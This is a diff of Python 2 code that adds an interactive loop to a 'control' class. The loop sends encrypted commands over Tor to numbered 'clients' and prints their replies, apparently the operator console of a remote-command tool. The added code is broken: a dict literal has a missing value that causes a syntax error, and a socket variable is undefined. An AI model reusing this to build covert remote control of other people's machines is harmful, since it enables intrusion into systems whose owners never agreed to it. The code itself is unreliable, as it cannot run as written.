@@ -21,7 +21,7 @@ execfile("Control.conf", config)
 
 class control():
 	
-	def startTor():
+	def startTor(self):
 		print(term.format(" [+] Starting Tor Connection", term.Attr.BOLD))
 		global tor_process
 		tor_process = stem.process.launch_tor_with_config(
@@ -32,9 +32,25 @@ class control():
 			init_msg_handler = print_bootstrap_lines,
 		)
 
-	def stopTor():
+	def stopTor(self):
 		tor_process.kill() 
 	
+	def interact(self, client):
+		baseCmd = {"status":"OK", "command": "interact", "client":str(client), "action":}
+		title = "Client{cli}$".format(cli=client)
+		while True:
+			command = raw_input(title)
+			if command == "quit": break
+			else:
+				command = Encode().process(command)
+				command = encryption().encrypt(command, config["password"])
+				main().s.send(command)
+				reply = s.recv(20480)
+				reply = encryption().decrypt(reply, config["password"])
+				print "Reply: " + str(reply)
+				Reply = Api().main(reply)
+				print str(Reply)
+		
 	def main(self):
 		try:
 			if config["tor"]==True and config["server"] != "127.0.0.1":
